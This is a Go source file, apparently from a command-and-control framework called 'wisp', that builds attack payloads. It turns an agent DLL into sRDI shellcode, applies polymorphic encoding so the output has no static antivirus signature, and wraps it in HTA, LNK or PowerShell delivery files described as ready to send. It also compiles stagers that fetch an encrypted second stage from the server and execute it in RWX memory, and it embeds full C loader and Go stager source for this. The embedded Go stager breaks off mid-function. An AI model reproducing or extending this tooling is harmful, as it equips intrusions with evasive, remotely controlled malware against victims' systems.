package services

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/user/wisp/internal/db"
	"github.com/user/wisp/internal/poly"
	"github.com/user/wisp/internal/shellcode"
	"github.com/user/wisp/internal/srdi"
	"github.com/user/wisp/internal/stager"
	"github.com/user/wisp/shared/protocol"
)

// ShellcodeService handles shellcode and staged-stager generation.
type ShellcodeService struct {
	serverSvc *ServerService
}

// NewShellcodeService creates a new ShellcodeService.
func NewShellcodeService(serverSvc *ServerService) *ShellcodeService {
	return &ShellcodeService{serverSvc: serverSvc}
}

// templatesDir returns the directory holding pre-built agent templates.
func (ss *ShellcodeService) templatesDir() string {
	return filepath.Join(exeDir(), "templates")
}

// ShellcodeConfig drives shellcode / stager generation.
type ShellcodeConfig struct {
	// ListenerID selects the listener whose callback address is baked in.
	ListenerID string `json:"listener_id"`
	// TargetOS / TargetArch select the agent DLL template (windows/amd64 only
	// for sRDI shellcode; other combinations are validated against templates).
	TargetOS   string `json:"target_os"`
	TargetArch string `json:"target_arch"`
	// Mode: "shellcode" (stageless sRDI blob) or "staged" (tiny stager that
	// fetches the stage-2 from /stage/<token>).
	Mode string `json:"mode"`
	// StagerLang selects the staged-stager implementation: "go" (default, uses
	// a full Go runtime, supports HTTPS) or "c" (pure C position-independent
	// shellcode, ~2.3 KB, HTTP only). Ignored when Mode != "staged".
	StagerLang string `json:"stager_lang"`
	// Format is a shellcode.Format ("raw","c","csharp",...).
	Format string `json:"format"`
	// StageTTLMinutes is how long the issued stage-2 stays valid (0 = forever).
	StageTTLMinutes int `json:"stage_ttl_minutes"`
	// ReuseStage makes the stage token reusable (not consumed on first fetch)
	// so the same stager can be deployed to many hosts.
	ReuseStage bool `json:"reuse_stage"`
	// Poly wraps the output shellcode with a polymorphic SGN-style self-decoding
	// stub (random registers / junk / layout / key per build → no static byte
	// signature). Only applies to Mode == "shellcode".
	Poly bool `json:"poly"`
	// TrafficProfile bakes UA rotation / URI alternation into the stage-2 agent
	// (Malleable-profile lite). Optional.
	TrafficProfile *TrafficProfileCfg `json:"traffic_profile,omitempty"`
	// Sleep / Jitter are forwarded into the agent config overlay.
	Sleep  int `json:"sleep"`
	Jitter int `json:"jitter"`
	// OutputPath overrides the default payload directory.
	OutputPath string `json:"output_path"`
}

// dllTemplateFor returns the path of the agent DLL template for an OS/arch.
func (ss *ShellcodeService) dllTemplateFor(targetOS, arch string) (string, error) {
	if targetOS != "windows" {
		return "", fmt.Errorf("sRDI shellcode requires a windows agent DLL (got %s)", targetOS)
	}
	if arch != "amd64" {
		return "", fmt.Errorf("sRDI shellcode requires amd64 (got %s)", arch)
	}
	// Preferred template is the Rust agent DLL (reflective-load compatible:
	// Go c-shared DLLs crash under sRDI because the Go runtime needs loader
	// initialisation). Fall back to the Go DLL if the Rust one is absent.
	candidates := []string{"agent_rust_windows_amd64.dll", "agent_windows_amd64.dll"}
	for _, name := range candidates {
		p := filepath.Join(ss.templatesDir(), name)
		if _, err := os.Stat(p); err == nil {
			return p, nil
		}
	}
	return "", fmt.Errorf("agent DLL template not found in %s (need agent_rust_windows_amd64.dll or agent_windows_amd64.dll)", ss.templatesDir())
}

// payloadAgentConfig mirrors the agent's config.Config JSON so the staged agent
// can deserialize it. Defined here (instead of reusing PayloadService.AgentConfig)
// to keep shellcode generation self-contained.
type payloadAgentConfig struct {
	ServerHost        string `json:"server_host"`
	ServerPort        int    `json:"server_port"`
	UseTLS            bool   `json:"use_tls"`
	Transport         string `json:"transport"`
	PSK               string `json:"psk"`
	ServerFingerprint string `json:"server_fp"`
	Sleep             int    `json:"sleep"`
	Jitter            int    `json:"jitter"`
	KillDate          int64  `json:"kill_date"`
	RSAPublicKey      string `json:"rsa_public_key"`
	CanaryToken       string `json:"canary_token,omitempty"`
	TrafficProfile    *TrafficProfileCfg `json:"traffic_profile,omitempty"`
}

// stage2DLL appends the config overlay to the template DLL, producing the
// stage-2 module that the sRDI loader will map and execute. Without the
// overlay the agent has no server configuration.
func (ss *ShellcodeService) stage2DLL(listener *db.ListenerRow, sleep, jitter int, tp *TrafficProfileCfg) ([]byte, error) {
	dllPath, err := ss.dllTemplateFor("windows", "amd64")
	if err != nil {
		return nil, err
	}
	dll, err := os.ReadFile(dllPath)
	if err != nil {
		return nil, err
	}
	cfgJSON, err := json.Marshal(ss.stageConfig(listener, sleep, jitter, tp))
	if err != nil {
		return nil, err
	}
	cfgB64 := base64.StdEncoding.EncodeToString(cfgJSON)
	out := make([]byte, 0, len(dll)+len(protocol.OverlayMarker)+len(cfgB64))
	out = append(out, dll...)
	out = append(out, protocol.OverlayMarker...)
	out = append(out, cfgB64...)
	return out, nil
}

// stageConfig builds the agent JSON config for a staged payload. Each build
// gets a unique canary token (burn detection): a sandbox/AV that runs the
// payload will trigger the startup /canary/<token> lookup.
func (ss *ShellcodeService) stageConfig(listener *db.ListenerRow, sleep, jitter int, tp *TrafficProfileCfg) payloadAgentConfig {
	host := listener.Host
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = listener.BindHost
	}
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = pickServerHost()
	}
	if sleep <= 0 {
		sleep = 5000
	}
	cfg := payloadAgentConfig{
		ServerHost:        host,
		ServerPort:        listener.BindPort,
		UseTLS:            listener.UseTLS,
		Transport:         listener.Protocol,
		PSK:               listener.PSK,
		ServerFingerprint: ss.serverSvc.GetServer().TLSFingerprint(),
		Sleep:             sleep,
		Jitter:            jitter,
		RSAPublicKey:      ss.serverSvc.GetRSAPublicKey(),
		TrafficProfile:    mergeTrafficProfile(listener, tp),
	}
	if token := ss.issueCanary("staged-" + listener.Name); token != "" {
		cfg.CanaryToken = token
	}
	return cfg
}

// mergeTrafficProfile folds the listener's Malleable profile (custom URIs and
// UAs) into the operator-supplied traffic profile, so the agent's outbound
// requests align with the server's registered paths. Operator-supplied values
// win on conflict.
func mergeTrafficProfile(listener *db.ListenerRow, tp *TrafficProfileCfg) *TrafficProfileCfg {
	mp := listener.MalleableProfile()
	out := &TrafficProfileCfg{}
	if tp != nil {
		*out = *tp
	}
	if out.UserAgents == nil && len(mp.UserAgents) > 0 {
		out.UserAgents = mp.UserAgents
	}
	if mp.RegisterURI != "" && out.RegisterURI == "" {
		out.RegisterURI = mp.RegisterURI
	}
	if mp.CheckinURI != "" && out.CheckinURI == "" {
		out.CheckinURI = mp.CheckinURI
	}
	if mp.PubKeyURI != "" && out.PubKeyURI == "" {
		out.PubKeyURI = mp.PubKeyURI
	}
	if len(out.UserAgents) == 0 && len(out.URIs) == 0 &&
		out.RegisterURI == "" && out.CheckinURI == "" && out.PubKeyURI == "" {
		return nil
	}
	return out
}

// issueCanary creates a unique per-build burn-detection token and registers it
// in the database. Returns "" on failure (canary is best-effort).
func (ss *ShellcodeService) issueCanary(buildName string) string {
	if ss.serverSvc == nil || ss.serverSvc.GetServer() == nil || ss.serverSvc.GetDB() == nil {
		return ""
	}
	tb := make([]byte, 12)
	if _, err := rand.Read(tb); err != nil {
		return ""
	}
	token := hex.EncodeToString(tb)
	if err := ss.serverSvc.GetServer().IssueCanary(token, buildName); err != nil {
		return ""
	}
	return token
}

// GenerateShellcode converts the agent DLL into a self-contained sRDI shellcode
// blob and renders it in the requested format. The DLL carries the config
// overlay (server ip/port/psk/rsa key) so the loaded agent can dial the server.
func (ss *ShellcodeService) GenerateShellcode(config ShellcodeConfig) (string, error) {
	if config.ListenerID == "" {
		return "", fmt.Errorf("listener id is required")
	}
	listener, err := ss.serverSvc.GetDB().GetListener(config.ListenerID)
	if err != nil {
		return "", fmt.Errorf("get listener: %w", err)
	}

	dll, err := ss.stage2DLL(listener, config.Sleep, config.Jitter, config.TrafficProfile)
	if err != nil {
		return "", err
	}

	blob, err := srdi.Pack(dll)
	if err != nil {
		return "", fmt.Errorf("pack shellcode: %w", err)
	}

	// Optional polymorphic encoding: each build produces a unique binary, so
	// the on-disk shellcode has no static signature. Applied before format
	// conversion so the loader just allocates + copies + jumps.
	if config.Poly {
		blob, err = poly.Encode(blob)
		if err != nil {
			return "", fmt.Errorf("poly encode: %w", err)
		}
	}

	format := shellcode.Format(config.Format)
	if format == "" {
		format = shellcode.FormatRaw
	}
	text, err := shellcode.Convert(blob, format)
	if err != nil {
		return "", err
	}

	// A formatted (text) shellcode carries no config overlay; staged stagers
	// and raw exe payloads bake the listener config separately.
	_ = listener

	return ss.writeShellcodeOutput(config, text, format)
}

// writeShellcodeOutput persists the rendered shellcode.
func (ss *ShellcodeService) writeShellcodeOutput(config ShellcodeConfig, content string, format shellcode.Format) (string, error) {
	outPath := config.OutputPath
	if outPath == "" {
		ext := ".bin"
		switch format {
		case shellcode.FormatCArray:
			ext = ".c"
		case shellcode.FormatCSharp:
			ext = ".cs"
		case shellcode.FormatPowerShell:
			ext = ".ps1"
		case shellcode.FormatPython:
			ext = ".py"
		case shellcode.FormatVBA:
			ext = ".vba"
		case shellcode.FormatHTA:
			ext = ".hta"
		}
		outPath = filepath.Join(exeDir(), "payloads", fmt.Sprintf("shellcode_%s_%s_%s%s", config.TargetOS, config.TargetArch, config.Format, ext))
	}
	if err := os.MkdirAll(filepath.Dir(outPath), 0755); err != nil {
		return "", err
	}
	if err := os.WriteFile(outPath, []byte(content), 0755); err != nil {
		return "", fmt.Errorf("write shellcode: %w", err)
	}
	return outPath, nil
}

// StagerResult describes a generated staged payload.
type StagerResult struct {
	StagerPath string `json:"stager_path"`
	StageURL   string `json:"stage_url"`
	Token      string `json:"token"`
	Size       int    `json:"size"`
}

// GenerateStager implements the staged workflow:
//  1. pack the agent DLL into a self-contained stage-2 blob,
//  2. register it in the listener's one-time stage store (encrypted, per-stage
//     key that is baked into the stager),
//  3. compile a tiny stager that fetches /stage/<token>, decrypts and executes
//     the blob.
//
// StagerLang "go" produces a Go-compiled stager executable (supports HTTPS,
// uses AES-GCM). StagerLang "c" produces ~2.3 KB position-independent raw
// shellcode (HTTP only, XOR stage encryption) in the requested format — a
// Cobalt-Strike-style first stage. StagerLang "rust" is accepted as a synonym
// for "c" when no Rust toolchain is available (the C blob is language-neutral
// machine code).
func (ss *ShellcodeService) GenerateStager(config ShellcodeConfig) (*StagerResult, error) {
	if config.ListenerID == "" {
		return nil, fmt.Errorf("listener id is required")
	}
	listener, err := ss.serverSvc.GetDB().GetListener(config.ListenerID)
	if err != nil {
		return nil, fmt.Errorf("get listener: %w", err)
	}

	// stage2 carries the agent config overlay (server ip/port/psk/rsa key).
	dll, err := ss.stage2DLL(listener, config.Sleep, config.Jitter, config.TrafficProfile)
	if err != nil {
		return nil, err
	}
	stage2, err := srdi.Pack(dll)
	if err != nil {
		return nil, fmt.Errorf("pack stage2: %w", err)
	}

	host := listener.Host
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = listener.BindHost
	}
	scheme := "http"
	if listener.UseTLS {
		scheme = "https"
	}

	ttl := stageTTL(config.StageTTLMinutes)

	if config.StagerLang == "c" {
		return ss.generateCStager(config, listener, host, scheme, stage2, ttl)
	}

	// Rust stager: precompiled template + config patch (AES-GCM JSON protocol,
	// like the Go stager, but no per-payload compilation).
	if config.StagerLang == "rust" {
		return ss.generateRustStager(config, listener, host, scheme, stage2, ttl)
	}

	if config.ReuseStage {
		token, keyB64, err := ss.serverSvc.GetServer().IssueStagePersistent(stage2, ttl, false)
		if err != nil {
			return nil, fmt.Errorf("issue stage: %w", err)
		}
		stageURL := stageURL(scheme, host, listener.BindPort, token, listener)
		bin, err := ss.buildGoStager(config, stageURL, keyB64)
		if err != nil {
			return nil, err
		}
		return &StagerResult{
			StagerPath: bin,
			StageURL:   stageURL,
			Token:      token,
			Size:       stageSize(bin),
		}, nil
	}

	token, keyB64, err := ss.serverSvc.GetServer().IssueStage(stage2, ttl)
	if err != nil {
		return nil, fmt.Errorf("issue stage: %w", err)
	}
	stageURL := stageURL(scheme, host, listener.BindPort, token, listener)

	bin, err := ss.buildGoStager(config, stageURL, keyB64)
	if err != nil {
		return nil, err
	}
	return &StagerResult{
		StagerPath: bin,
		StageURL:   stageURL,
		Token:      token,
		Size:       stageSize(bin),
	}, nil
}

// stageURL builds the human-readable stage URL for a token, honoring the
// listener's Malleable profile stage prefix.
func stageURL(scheme, host string, port int, token string, listener *db.ListenerRow) string {
	prefix := "/stage/"
	if listener != nil {
		if p := listener.MalleableProfile().StagePrefix; p != "" {
			prefix = p
		}
	}
	return fmt.Sprintf("%s://%s:%d%s%s", scheme, host, port, prefix, token)
}

// stageTTL converts a user-supplied TTL (minutes) into a time.Duration.
// 0 means "forever" (never auto-expire).
func stageTTL(minutes int) time.Duration {
	if minutes <= 0 {
		return 0
	}
	return time.Duration(minutes) * time.Minute
}

// GenerateDelivery produces a one-shot delivery document (LNK/HTA/HTML/PS1)
// that loads the sRDI shellcode via an in-memory PowerShell loader. This is a
// convenience wrapper around GenerateShellcode + DeliveryService.Generate so
// the operator gets a ready-to-send file in one call.
func (ss *ShellcodeService) GenerateDelivery(config ShellcodeConfig) (string, error) {
	// Reuse the shellcode pipeline to get a raw sRDI blob (optionally
	// polymorphically encoded), then wrap it in the delivery document.
	if config.ListenerID == "" {
		return "", fmt.Errorf("listener id is required")
	}
	listener, err := ss.serverSvc.GetDB().GetListener(config.ListenerID)
	if err != nil {
		return "", fmt.Errorf("get listener: %w", err)
	}
	dll, err := ss.stage2DLL(listener, config.Sleep, config.Jitter, config.TrafficProfile)
	if err != nil {
		return "", err
	}
	blob, err := srdi.Pack(dll)
	if err != nil {
		return "", fmt.Errorf("pack shellcode: %w", err)
	}
	if config.Poly {
		blob, err = poly.Encode(blob)
		if err != nil {
			return "", fmt.Errorf("poly encode: %w", err)
		}
	}

	format := DeliveryFormat(config.Format)
	if format == "" {
		format = DeliveryHTA
	}
	ds := NewDeliveryService(ss.serverSvc)
	return ds.Generate(format, blob, config.OutputPath)
}

// generateCStager builds the tiny position-independent C stager. The stage is
// issued with XOR encryption (AES-GCM does not fit in 2 KB) and the blob is
// rendered in the requested shellcode format, or wrapped into a small EXE when
// format == "exe" (the stager then runs directly on the target, no loader
// needed; much smaller than the Go-compiled stager).
func (ss *ShellcodeService) generateCStager(config ShellcodeConfig, listener *db.ListenerRow, host, scheme string, stage2 []byte, ttl time.Duration) (*StagerResult, error) {
	if scheme != "http" {
		return nil, fmt.Errorf("pure-C stager requires an HTTP listener (HTTPS needs the Go stager: set stager_lang=go)")
	}
	if listener.UseTLS {
		return nil, fmt.Errorf("pure-C stager requires an HTTP listener (HTTPS needs the Go stager: set stager_lang=go)")
	}
	ip, err := stager.ResolveIP(host)
	if err != nil {
		return nil, err
	}

	var token, keyB64 string
	if config.ReuseStage {
		token, keyB64, err = ss.serverSvc.GetServer().IssueStagePersistent(stage2, ttl, true)
	} else {
		token, keyB64, err = ss.serverSvc.GetServer().IssueStageXOR(stage2, ttl)
	}
	if err != nil {
		return nil, fmt.Errorf("issue stage: %w", err)
	}
	key, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil {
		return nil, err
	}
	// Malleable profile: stage downloads use the configured prefix so the C
	// stager's first request looks like fetching a benign static asset.
	stagePrefix := listener.MalleableProfile().StagePrefix
	if stagePrefix == "" {
		stagePrefix = "/stage/"
	}
	path := stagePrefix + token + "?raw=1"

	blob, err := stager.Build(stager.Config{
		IP:   ip,
		Port: listener.BindPort,
		Key:  key,
		Path: path,
	})
	if err != nil {
		return nil, err
	}

	format := shellcode.Format(config.Format)
	if format == "" {
		format = shellcode.FormatRaw
	}

	// EXE mode: wrap the stager shellcode into a minimal C loader and compile
	// with mingw. Output is a small standalone executable (~15-30 KB).
	// DLL mode: the same shellcode inside a DLL (rundll32 / reflective load).
	// Both prefer the precompiled template (patch the embedded config, no
	// compiler needed at deploy time); they fall back to on-the-fly mingw
	// compilation only when the template is missing.
	switch format {
	case "exe":
		outPath := config.OutputPath
		if outPath == "" {
			outPath = filepath.Join(exeDir(), "payloads", fmt.Sprintf("stager_c_%s_%s.exe", config.TargetOS, config.TargetArch))
		}
		exe, err := ss.buildCStagerExe(blob, outPath)
		if err != nil {
			return nil, err
		}
		stageURL := stageURL(scheme, host, listener.BindPort, token, listener)
		return &StagerResult{
			StagerPath: exe,
			StageURL:   stageURL,
			Token:      token,
			Size:       stageSize(exe),
		}, nil
	case "dll":
		outPath := config.OutputPath
		if outPath == "" {
			outPath = filepath.Join(exeDir(), "payloads", fmt.Sprintf("stager_c_%s_%s.dll", config.TargetOS, config.TargetArch))
		}
		dll, err := ss.buildCStagerDll(blob, outPath)
		if err != nil {
			return nil, err
		}
		stageURL := stageURL(scheme, host, listener.BindPort, token, listener)
		return &StagerResult{
			StagerPath: dll,
			StageURL:   stageURL,
			Token:      token,
			Size:       stageSize(dll),
		}, nil
	}

	text, err := shellcode.Convert(blob, format)
	if err != nil {
		return nil, err
	}

	outPath := config.OutputPath
	if outPath == "" {
		ext := ".bin"
		switch format {
		case shellcode.FormatCArray:
			ext = ".c"
		case shellcode.FormatCSharp:
			ext = ".cs"
		case shellcode.FormatPowerShell:
			ext = ".ps1"
		case shellcode.FormatPython:
			ext = ".py"
		case shellcode.FormatVBA:
			ext = ".vba"
		case shellcode.FormatHTA:
			ext = ".hta"
		}
		outPath = filepath.Join(exeDir(), "payloads", fmt.Sprintf("stager_c_%s_%s_%s%s", config.TargetOS, config.TargetArch, config.Format, ext))
	}
	if err := os.MkdirAll(filepath.Dir(outPath), 0755); err != nil {
		return nil, err
	}
	if err := os.WriteFile(outPath, []byte(text), 0755); err != nil {
		return nil, fmt.Errorf("write stager: %w", err)
	}

	stageURL := stageURL(scheme, host, listener.BindPort, token, listener)
	return &StagerResult{
		StagerPath: outPath,
		StageURL:   stageURL,
		Token:      token,
		Size:       len(blob),
	}, nil
}

// buildCStagerExe wraps the stager shellcode into a minimal C loader and
// compiles it to a small standalone Windows executable with mingw. The stager
// is ~2.3 KB; the resulting EXE is typically 15-30 KB (vs 6 MB for the Go
// stager), so it can be dropped onto the target and run directly — no second
// loader needed.
func (ss *ShellcodeService) buildCStagerExe(blob []byte, outPath string) (string, error) {
	// Preferred path: precompiled template + config patch (no compiler needed
	// at deploy time). Falls back to on-the-fly mingw compilation below.
	if patched, err := ss.patchStagerTemplate("stager_c_template.exe", blob); err == nil {
		if err := ss.writePayload(outPath, patched, 0755); err != nil {
			return "", err
		}
		return outPath, nil
	}

	dir, err := os.MkdirTemp("", "wisp-stager-exe-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(dir)

	src := filepath.Join(dir, "main.c")
	var b strings.Builder
	b.WriteString("// generated stager EXE (stage1 runnable directly)\n")
	b.WriteString("#include <windows.h>\n")
	b.WriteString("#include <string.h>\n\n")
	b.WriteString("unsigned char SC[] = {")
	for i, c := range blob {
		if i%12 == 0 {
			b.WriteString("\n\t")
		}
		fmt.Fprintf(&b, "0x%02x, ", c)
	}
	b.WriteString("\n};\n\n")
	b.WriteString("int main(void) {\n")
	b.WriteString("\tvoid* m = VirtualAlloc(0, sizeof(SC), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n")
	b.WriteString("\tif (!m) return 1;\n")
	b.WriteString("\tmemcpy(m, SC, sizeof(SC));\n")
	b.WriteString("\t((void(*)(void))m)();\n")
	b.WriteString("\treturn 0;\n}\n")
	if err := os.WriteFile(src, []byte(b.String()), 0644); err != nil {
		return "", err
	}

	gcc := findMingwGCC()
	if gcc == "" {
		return "", fmt.Errorf("EXE stager needs x86_64-w64-mingw32-gcc (not found in PATH) and no precompiled template is available")
	}
	if err := os.MkdirAll(filepath.Dir(outPath), 0755); err != nil {
		return "", err
	}
	cmd := exec.Command(gcc, "-O1", "-s", "-o", outPath, src)
	buildOut, buildErr := cmd.CombinedOutput()
	if buildErr != nil {
		return "", fmt.Errorf("c-stager exe build failed: %v\n%s", buildErr, string(buildOut))
	}
	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("c-stager exe missing after build")
	}
	return outPath, nil
}

// buildCStagerDll builds a stager DLL: the shellcode inside a DLL that runs on
// load (DllMain) or via the exported StartStager() entry. Prefers the
// precompiled template; falls back to mingw compilation.
func (ss *ShellcodeService) buildCStagerDll(blob []byte, outPath string) (string, error) {
	if patched, err := ss.patchStagerTemplate("stager_c_template.dll", blob); err == nil {
		if err := ss.writePayload(outPath, patched, 0755); err != nil {
			return "", err
		}
		return outPath, nil
	}

	dir, err := os.MkdirTemp("", "wisp-stager-dll-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(dir)

	src := filepath.Join(dir, "stager_dll.c")
	var b strings.Builder
	b.WriteString("#include <windows.h>\n")
	b.WriteString("#include <string.h>\n\n")
	b.WriteString("unsigned char SC[] = {")
	for i, c := range blob {
		if i%12 == 0 {
			b.WriteString("\n\t")
		}
		fmt.Fprintf(&b, "0x%02x, ", c)
	}
	b.WriteString("\n};\n\n")
	b.WriteString("static void run_stager(void) {\n")
	b.WriteString("\tvoid* m = VirtualAlloc(0, sizeof(SC), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n")
	b.WriteString("\tif (!m) return;\n\tmemcpy(m, SC, sizeof(SC));\n\t((void(*)(void))m)();\n}\n")
	b.WriteString("\nstatic DWORD WINAPI worker(LPVOID p) { (void)p; run_stager(); return 0; }\n")
	b.WriteString("\n__declspec(dllexport) void StartStager(void) {\n")
	b.WriteString("\tHANDLE t = CreateThread(NULL, 0, worker, NULL, 0, NULL);\n\tif (t) CloseHandle(t);\n}\n")
	b.WriteString("\nBOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {\n")
	b.WriteString("\t(void)h; (void)r;\n\tif (reason == DLL_PROCESS_ATTACH) StartStager();\n\treturn TRUE;\n}\n")
	if err := os.WriteFile(src, []byte(b.String()), 0644); err != nil {
		return "", err
	}

	gcc := findMingwGCC()
	if gcc == "" {
		return "", fmt.Errorf("DLL stager needs x86_64-w64-mingw32-gcc (not found in PATH) and no precompiled template is available")
	}
	if err := os.MkdirAll(filepath.Dir(outPath), 0755); err != nil {
		return "", err
	}
	cmd := exec.Command(gcc, "-shared", "-O1", "-s", "-o", outPath, src)
	buildOut, buildErr := cmd.CombinedOutput()
	if buildErr != nil {
		return "", fmt.Errorf("c-stager dll build failed: %v\n%s", buildErr, string(buildOut))
	}
	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("c-stager dll missing after build")
	}
	return outPath, nil
}

// patchStagerTemplate loads a precompiled stager template from templatesDir and
// overwrites its sentinel config block with the config embedded in `blob`
// (prologue + stager code + 170-byte config). Returns the patched binary.
func (ss *ShellcodeService) patchStagerTemplate(name string, blob []byte) ([]byte, error) {
	tmplPath := filepath.Join(ss.templatesDir(), name)
	tmpl, err := os.ReadFile(tmplPath)
	if err != nil {
		return nil, err
	}
	return stager.PatchTemplateBlob(tmpl, blob)
}

// writePayload writes bytes to outPath, creating parent dirs.
func (ss *ShellcodeService) writePayload(outPath string, data []byte, mode os.FileMode) error {
	if err := os.MkdirAll(filepath.Dir(outPath), 0755); err != nil {
		return err
	}
	return os.WriteFile(outPath, data, mode)
}

// findMingwGCC locates a mingw-w64 GCC toolchain.
func findMingwGCC() string {
	for _, name := range []string{"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe"} {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	return ""
}

func stageSize(path string) int {
	if fi, err := os.Stat(path); err == nil {
		return int(fi.Size())
	}
	return 0
}

// generateRustStager builds the Rust stager EXE from the precompiled template
// (bin/templates/stager_rust_template.exe): it issues an AES-GCM JSON stage
// (same wire protocol as the Go stager) and binary-patches the template's
// embedded config block (stage URL + AES key) — no per-payload compilation.
func (ss *ShellcodeService) generateRustStager(config ShellcodeConfig, listener *db.ListenerRow, host, scheme string, stage2 []byte, ttl time.Duration) (*StagerResult, error) {
	token, keyB64, err := ss.serverSvc.GetServer().IssueStage(stage2, ttl)
	if err != nil {
		return nil, fmt.Errorf("issue stage: %w", err)
	}
	stageURL := stageURL(scheme, host, listener.BindPort, token, listener)

	tmplPath := filepath.Join(ss.templatesDir(), "stager_rust_template.exe")
	tmpl, err := os.ReadFile(tmplPath)
	if err != nil {
		return nil, fmt.Errorf("Rust stager template not found: %w", err)
	}
	patched, err := stager.PatchRustStager(tmpl, stageURL, keyB64)
	if err != nil {
		return nil, fmt.Errorf("patch Rust stager: %w", err)
	}

	outPath := config.OutputPath
	if outPath == "" {
		outPath = filepath.Join(exeDir(), "payloads", fmt.Sprintf("stager_rust_%s_%s.exe", config.TargetOS, config.TargetArch))
	}
	if err := ss.writePayload(outPath, patched, 0755); err != nil {
		return nil, err
	}
	return &StagerResult{
		StagerPath: outPath,
		StageURL:   stageURL,
		Token:      token,
		Size:       len(patched),
	}, nil
}

// buildGoStager writes the stager template to a temp dir and compiles it for
// Windows/amd64. The stager embeds the stage URL and the AES key. It uses only
// the Go standard library (no external modules) so the build works offline.
func (ss *ShellcodeService) buildGoStager(config ShellcodeConfig, stageURL, keyB64 string) (string, error) {
	dir, err := os.MkdirTemp("", "wisp-stager-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(dir)

	// No external requires: the stager uses only syscall (kernel32 procs), so
	// the build needs no module downloads.
	mod := "module stager\n\ngo 1.21\n"
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte(mod), 0644); err != nil {
		return "", err
	}
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte(stagerMainSource), 0644); err != nil {
		return "", err
	}
	if err := os.WriteFile(filepath.Join(dir, "trampoline_amd64.s"), []byte(stagerTrampolineSource), 0644); err != nil {
		return "", err
	}

	cfgJSON, _ := json.Marshal(map[string]string{
		"url": stageURL,
		"key": keyB64,
	})
	out := filepath.Join(exeDir(), "payloads", fmt.Sprintf("stager_%s_%s%s", config.TargetOS, config.TargetArch, ".exe"))
	if err := os.MkdirAll(filepath.Dir(out), 0755); err != nil {
		return "", err
	}

	goBin, err := findGo()
	if err != nil {
		return "", err
	}

	args := []string{"build", "-trimpath", "-ldflags", "-s -w -X main.ConfigData=" + base64.StdEncoding.EncodeToString(cfgJSON), "-o", out, "."}
	cmd := exec.Command(goBin, args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
		"GOFLAGS=-mod=mod",
		"GOPROXY=off",
	)
	buildOut, buildErr := cmd.CombinedOutput()
	if buildErr != nil {
		return "", fmt.Errorf("stager build failed (%s): %s\n%s", goBin, buildErr, string(buildOut))
	}
	return out, nil
}

// findGo locates a usable Go toolchain. GUI-launched apps often lack PATH
// entries, so we also probe GOROOT and the common install locations.
func findGo() (string, error) {
	// 1. PATH
	if p, err := exec.LookPath("go"); err == nil {
		return p, nil
	}
	// 2. runtime.GOROOT (set when built with a toolchain)
	if gr := runtime.GOROOT(); gr != "" {
		cand := filepath.Join(gr, "bin", "go")
		if runtime.GOOS == "windows" {
			cand += ".exe"
		}
		if fileExists(cand) {
			return cand, nil
		}
	}
	// 3. Common install locations.
	candidates := []string{
		"/usr/local/go/bin/go",
		"/usr/lib/go/bin/go",
		"/opt/go/bin/go",
		"C:\\Go\\bin\\go.exe",
		"C:\\Program Files\\Go\\bin\\go.exe",
		"C:\\Program Files (x86)\\Go\\bin\\go.exe",
		os.Getenv("USERPROFILE") + "\\go\\bin\\go.exe",
		os.Getenv("LOCALAPPDATA") + "\\Programs\\Go\\bin\\go.exe",
	}
	for _, c := range candidates {
		if fileExists(c) {
			return c, nil
		}
	}
	return "", fmt.Errorf("stager build needs a Go toolchain: 'go' was not found in PATH, GOROOT or the common install locations")
}

// fileExists reports whether a path is a regular file.
func fileExists(p string) bool {
	fi, err := os.Stat(p)
	return err == nil && !fi.IsDir()
}

// stagerMainSource is the tiny Go stager: download stage-2, AES-GCM decrypt,
// VirtualAlloc + copy, jump. It uses only the standard library (kernel32 via
// syscall) so the build needs no external module downloads.
const stagerMainSource = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

// ConfigData is injected at build time via ldflags.
var ConfigData string

var (
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	procWriteProcMem  = kernel32.NewProc("WriteProcessMemory")
	procGetCurProc    = kernel32.NewProc("GetCurrentProcess")
)

type cfg struct {
	URL string ` + "`json:\"url\"`" + `
	Key string ` + "`json:\"key\"`" + `
}

func main() {
	var c cfg
	raw, err := base64.StdEncoding.DecodeString(ConfigData)
	if err != nil {
		os.Exit(1)
	}
	if err := json.Unmarshal(raw, &c); err != nil {
		os.Exit(1)
	}

	resp, err := http.Get(c.URL)
	if err != nil {
		os.Exit(1)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)
	}
	var out struct {
		Data string ` + "`json:\"data\"`" + `
	}
	if err := json.Unmarshal(body, &out); err != nil {
		os.Exit(1)
	}
	ct, err := base64.StdEncoding.DecodeString(out.Data)
	if err != nil {
		os.Exit(1)
	}
	key, err := base64.StdEncoding.DecodeString(c.Key)
	if err != nil {
		os.Exit(1)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		os.Exit(1)
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		os.Exit(1)
	}
	if len(ct) < aead.NonceSize() {
		os.Exit(1)
	}
	nonce, data := ct[:aead.NonceSize()], ct[aead.NonceSize():]
	plain, err := aead.Open(nil, nonce, data, nil)
	if err != nil {
		os.Exit(1)
	}

